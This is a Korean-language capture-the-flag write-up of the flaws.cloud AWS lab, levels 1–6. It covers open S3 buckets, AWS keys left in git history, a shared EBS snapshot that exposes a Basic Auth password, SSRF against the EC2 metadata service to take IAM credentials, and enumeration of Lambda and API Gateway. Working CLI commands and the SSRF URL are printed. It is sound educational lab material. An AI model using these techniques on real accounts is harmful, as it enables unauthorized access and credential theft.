## Level 1: Public S3 Bucket — 익명 사용자에게 버킷 목록 공개

### 핵심 취약점

**S3 버킷이 익명 사용자에게 ListBucket/GetObject 권한을 허용함**

- Level 1에서는 flaws.cloud가 S3 정적 웹사이트로 호스팅되고 있었고, 버킷 이름도 도메인과 동일했다.

```aws s3 ls s3://flaws.cloud/ --no-sign-request --region us-west-2```


- 이 명령으로 익명 사용자도 버킷 내부 파일 목록을 볼 수 있었다.



### 한 줄 요약
- S3 버킷이 완전 공개되어 익명 사용자가 내부 파일 목록과 객체를 볼 수 있었던 취약점



<br><br>



## Level 2: Authenticated AWS Users 대상 S3 공개 — AWS 계정 보유자 전체에게 공개

### 핵심 취약점

**S3 버킷이 익명은 막지만, AuthenticatedUsers 그룹에는 List/Get 권한을 허용함**

Level 1과 똑같이 접근해봤다.

```
aws s3 ls s3://level2-...flaws.cloud/ --no-sign-request

AccessDenied
```

이건 실패했다. 하지만 내 AWS CLI 계정으로는 성공했다.

```aws s3 ls s3://level2-...flaws.cloud/```

즉, **익명 사용자에게는 닫혀 있지만 AWS 계정이 있는 사람이라면 누구나 접근 가능한 상태**였다.

>AWS의 AuthenticatedUsers는 ~~내 조직 사용자~~ 가 아니라, 
AWS 계정으로 인증된 모든 사용자에 가깝다.

### 원인

- 개발자는 "익명 공개가 아니니까 안전하다"고 착각할 때 이런 취약점이 생길 수 있을 것 같다.
- 실제로는 전 세계 AWS 사용자에게 공개된 상태다.

### 한 줄 요약

- 익명 공개는 아니지만, 모든 인증된 AWS 사용자에게 S3 접근을 허용한 잘못된 권한 설정 취약점


<br><br>


## Level 3: Git Repository에 AWS Access Key 유출

### 핵심 취약점

**Git 커밋 히스토리에 AWS Access Key/Secret Key가 남아 있음**

- Level 2와 이어진다. S3 버킷을 내려받아 보니 .git 디렉토리가 있었고, git log에서 이런 커밋 메시지가 출력됐다.

`Oops, accidentally added something I shouldn't have`

- 업로드하면 안될것을 추가해서 커밋한거 같다.

- 이전 커밋으로 이동하면 삭제된 것처럼 보였던 민감 정보가 Git 히스토리에 그대로 남아 있었다.
    - AWS Access key와 secret key 등

`git checkout <old_commit>`



### 원인

1. 파일에서 키를 삭제해도 Git 히스토리에는 남음
2. 공개 저장소/공개 S3에 .git이 노출되면 과거 커밋까지 탈취 가능
3. 유출된 Access Key로 AWS API 접근 가능

Level 3의 원인은 “현재 파일 상태”가 아니라 **버전 관리 이력**이다.

### 한 줄 요약

- AWS Access Key를 Git에 커밋했고, 나중에 삭제했지만 Git 히스토리에 남아 있어 탈취 가능한 취약점

<br><br>

## Level 4: Public/Shared EBS Snapshot Exposure — EBS 스냅샷 노출

### 핵심 취약점

**EBS 스냅샷이 외부 AWS 계정에서 사용 가능하도록 공유되어 있음**

- Level 4에서는 EC2 스냅샷을 조회했다.

`aws ec2 describe-snapshots --owner-id 975426262029 --profile flaws`

- 그 결과 EBS Snapshot ID(snap-0b49342abd1bdcb89)를 확인했고
- 내 AWS 계정에서 이 스냅샷으로 EBS 볼륨을 만들 수 있었다.

```
aws ec2 create-volume \
  --availability-zone us-west-2a \
  --region us-west-2 \
  --snapshot-id snap-0b49342abd1bdcb89
```

- 그 후 내 EC2에 attach하고 mount해서 디스크 내부 파일을 확인했다.
    - ~~볼륨과 EC2 리전이 다르면 마운트가 안되는걸 처음 알았다~~

`sudo mount -o ro /dev/xvdf1 /mnt/flaws`

- 쉘 history를 확인한 결과 `/home/ubuntu/setupNginx.sh` 파일에서 웹 Basic Auth 계정 정보를 얻을 수 있었다.

```
htpasswd -b /etc/nginx/.htpasswd flaws nCP8xigdjpjyiXgJ7nJu7rw5Ro68iE8M

즉,
username: flaws
password: nCP8xigdjpjyiXgJ7nJu7rw5Ro68iE8M
```

### 원인

- EBS 스냅샷 = 서버 디스크 백업본
- 스냅샷이 노출되면 서버 파일시스템 전체가 노출됨
- .bash_history, 설정 파일, 웹 루트, SSH 키, credentials 등이 유출될 수 있음

### 한 줄 요약
- EBS 스냅샷이 외부 계정에서 복원 가능하도록 노출되어, EC2 디스크 전체를 열람할 수 있었던 취약점


<br><br>

## Level 5: SSRF를 통한 EC2 Metadata Credential 탈취
### 핵심 취약점
**취약한 HTTP Proxy를 통해 SSRF가 가능했고, EC2 Instance Metadata Service에 접근할 수 있었음**

- Level 5에는 단순 HTTP proxy가 주어진다.

`http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/<target>`

- 이 프록시는 사용자가 지정한 URL로 서버가 대신 요청을 보내는 구조였다.

```
사용자
→ Level 5 EC2 proxy
→ 사용자가 지정한 대상 URL
→ 응답 반환
```

### 원인
- 문제는 내부 주소 접근을 차단하지 않았다는 점. 
- 그래서 EC2 내부에서만 접근 가능한 **IMDS**에 접근할 수 있었다.

**http://169.254.169.254/latest/meta-data/**

- 실제 접근한 경로:

`http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/flaws`

- 여기서 EC2에 연결된 IAM Role의 임시 자격증명을 획득했다.

`AccessKeyId, SecretAccessKey, Token, Expiration`

- 이게 뭐지
    > `EC2 Instance Profile에 연결된 IAM Role의 STS Temporary Credentials`, 
    > 이 자격증명은 `ASIA...`로 시작하고, Token까지 함께 사용해야 합니다.

- 이후 이 임시 자격증명으로 Level 6 S3 버킷을 조회했다.

```
aws s3 ls s3://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud/ \
  --recursive \
  --profile level5 \
  --region us-west-2


ddcc78ff/hint1.html
ddcc78ff/hint2.html
ddcc78ff/index.html
index.html
```

숨겨진 prefix(ddcc78ff)를 찾았다.

- Level 6 진입 주소: `http://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud/ddcc78ff/`


### 한 줄 요약
- 취약한 HTTP 프록시가 내부 메타데이터 주소 접근을 허용해, EC2 IAM Role의 임시 자격증명이 노출된 취약점


<br><br>

## Level 6: SecurityAudit 권한을 통한 AWS 계정 내부 정찰
### 핵심 취약점
**SecurityAudit 성격의 읽기 권한과 일부 API Gateway 조회 권한만으로도 숨겨진 API 엔드포인트를 찾을 수 있음**

- Level 6에서는 별도의 Access Key ID와 Secret Access Key가 주어진다. 
- 이 키에는 다음 정책들이 붙어 있다.

```
aws --profile level6 iam list-attached-user-policies --user-name Level6


MySecurityAudit
list_apigateways
```

- MySecurityAudit은 원래 있는거니까 **list_apigateways** 정책을 확인

```
aws --profile level6 iam get-policy \
  --policy-arn arn:aws:iam::975426262029:policy/list_apigateways
```

- 기본 버전은 v4인것을 확인

```
aws --profile level6 iam get-policy-version \
  --policy-arn arn:aws:iam::975426262029:policy/list_apigateways \
  --version-id v4


{
  "Action": [
    "apigateway:GET"
  ],
  "Effect": "Allow",
  "Resource": "arn:aws:apigateway:us-west-2::/restapis/*"
}
```


- 이 권한이 **/restapis/\***만 허용한다
    - /restapis     → 전체 API 목록 조회
    - /restapis/*   → **특정 API ID를 알고 있을 때 상세 조회**

- 그래서 전체 API 목록 조회는 실패했다.

- 따라서 다른 서비스에서 API Gateway ID를 찾아야 했다. (여기부터는 그냥 힌트로 공부)

- SecurityAudit 정책을 보니 **Lambda 조회가 가능**했다.
    > API Gateway는 입구, Lambda는 실제 실행되는 백엔드 코드입니다.

`aws --region us-west-2 --profile level6 lambda list-functions`

- 여기서 Lambda 함수 Level6을 찾았고, **Lambda 함수 정책을 확인**했다.

`aws --region us-west-2 --profile level6 lambda get-policy --function-name Level6`
- 위 명령어는 Level6 Lambda 함수를 호출할 수 있는 주체를 보여준다.

### Lambda 정책을 왜 봤나?

    - Lambda 함수는 아무나 호출하면 안 된다. 그래서 Lambda에는 Resource-based policy가 붙을 수 있다. 
    (누가 이 Lambda 함수를 호출할 수 있는가?)

    - 예를 들어 API Gateway가 Lambda를 호출하려면 Lambda 쪽 정책에 이런 허용문이 있어야 한다.
    `이 API Gateway는 이 Lambda를 Invoke 해도 된다.`



- Lambda 정책에서 API Gateway ARN 발견

```
arn:aws:execute-api:us-west-2:975426262029:s33ppypa75/*/GET/level6

ARN의 구조는 다음과 같다.
arn:aws:execute-api:{region}:{account-id}:{rest-api-id}/{*stage*}/{method}/{resource}

따라서 
region      = us-west-2
account-id  = 975426262029
rest-api-id = s33ppypa75
stage       = *
method      = GET
resource    = /level6
```


- 여기서 중요한건 API Gateway ID.
    - REST API ID = s33ppypa75

- 즉, 전체 API 목록은 못 봤지만 **Lambda 정책에서 API Gateway ID를 역추적한 것**


- 이제 /restapis/* 권한을 활용해 **stage를 조회**했다.
> Stage가 무엇인가? API Gateway에서 stage는 배포 환경 이름. 같은 API라도 stage별로 다르게 배포할 수 있다.

`aws --profile level6 --region us-west-2 apigateway get-stages \
  --rest-api-id s33ppypa75`

- stage 이름 = Prod


- 따라서 최종 URL은

```
https://{rest-api-id}.execute-api.{region}.amazonaws.com/{stage}/{resource}

https://s33ppypa75.execute-api.us-west-2.amazonaws.com/Prod/level6
        └────────┘             └────────┘                 └──┘ └────┘
        API ID                  Region                    Stage Resource
```

### 한 줄 요약

- 읽기 전용처럼 보이는 감사 권한도 계정 구조, Lambda 정책, API Gateway ARN, 숨겨진 엔드포인트를 노출할 수 있다.
